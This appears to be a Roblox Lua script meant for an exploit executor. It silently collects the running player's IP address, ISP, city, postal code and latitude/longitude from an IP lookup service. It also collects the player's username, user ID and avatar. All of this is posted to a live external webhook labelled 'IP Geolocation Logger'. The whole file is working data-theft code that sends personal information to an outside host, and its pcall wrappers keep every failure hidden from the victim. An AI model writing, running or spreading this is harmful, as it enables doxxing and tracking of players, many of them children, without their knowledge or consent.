local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- Script ejecutado (modificable desde otro script usando _G.script_executed)
local script_executed = _G.script_executed or "Not Found"

-- Obtener datos IP
local function getIPInfo()
    local success, result = pcall(function()
        return HttpService:JSONDecode(game:HttpGet("https://ipapi.co/json"))
    end)
    return success and result or {}
end

local ipData = getIPInfo()

-- Obtener avatar
local function getAvatarUrl()
    local url = "https://thumbnails.roblox.com/v1/users/avatar?userIds=" .. player.UserId .. "&size=720x720&format=Png&isCircular=false"
    local success, data = pcall(function()
        return HttpService:JSONDecode(game:HttpGet(url)).data[1].imageUrl
    end)
    return success and data or "https://i.ibb.co/mVYFTK2f/Avatar-Not-Found.png"
end

local avatarUrl = getAvatarUrl()

-- Crear campos para el embed
local function createField(name, key)
    local value = ipData[key] and tostring(ipData[key]) or "Not Found"
    if key == "executed_script" then
        value = script_executed
    end
    return {
        name = name,
        value = value,
        inline = true
    }
end

-- Lista completa de campos
local fields = {
    { name = "Username", value = player.Name, inline = true },
    { name = "User ID", value = tostring(player.UserId), inline = true },
    createField("Executed Script", "executed_script"),
    createField("IP Address", "ip"),
    createField("Network Range", "network"),
    createField("ASN (Autonomous System Number)", "asn"),
    createField("ISP (Internet Service Provider)", "org"),
    createField("Country", "country_name"),
    createField("Region/Province", "region"),
    createField("City", "city"),
    createField("Postal Code", "postal"),
    createField("Latitude", "latitude"),
    createField("Longitude", "longitude"),
    createField("Timezone", "timezone")
}

-- Webhook URL
local webhook_url = "https://l.webhook.party/hook/UhmC9lTLZKI6YMQfc9LwrwLPFzL%2BGxFO%2BstLQOE3slw9Bev78Zkfkc0IOdkr6%2Fvo45MpGmza1zthpwRkkP972KrY1Zdpp6kiK5LzyMr09xxU8%2FdybOnABAdHQG2tZZGd2Rcu9uY7DLe3YChbg7Silc9K9sYiRACjKoWOP1ntopw7zpCvqeGUaGZs5Zmiy7A%2BmKiYOe2iHdy4mH2Udl0%2FI%2FMB20D9U7pKmnbTQcKATLXml9l1oVTDeC9O3BRo%2FLrj0UbFr6BiFDgAdmuHAifBuGhQMBmY56JA%2BG2Aot8qMhpPnqVOn8Os8YKZ4N%2BRcFG7agnQWPVjwLgWJ4G2MQ3AZywHy47Kz4ONmhkx150FbG4XZdGZxcCaZsDAz4xm%2FQG8XRi4GWRkPKw%3D/ViaTuzjhjElC6x2r"

-- Enviar a webhook
pcall(function()
    (request or http_request or http and http.request)({
        Url = webhook_url,
        Method = "POST",
        Headers = {
            ["content-type"] = "application/json"
        },
        Body = HttpService:JSONEncode({
            username = "IP Geolocation Logger",
            avatar_url = "https://i.ibb.co/spwWKyBW/Globe-With-Meridians.png",
            embeds = {
                {
                    title = "Nuevo usuario detectado: " .. player.Name,
                    color = 1733608,
                    fields = fields
                },
                {
                    title = "Ver perfil de " .. player.Name,
                    url = "https://www.roblox.com/users/" .. player.UserId .. "/profile",
                    color = 1733608,
                    image = { url = avatarUrl }
                }
            }
        })
    })
end)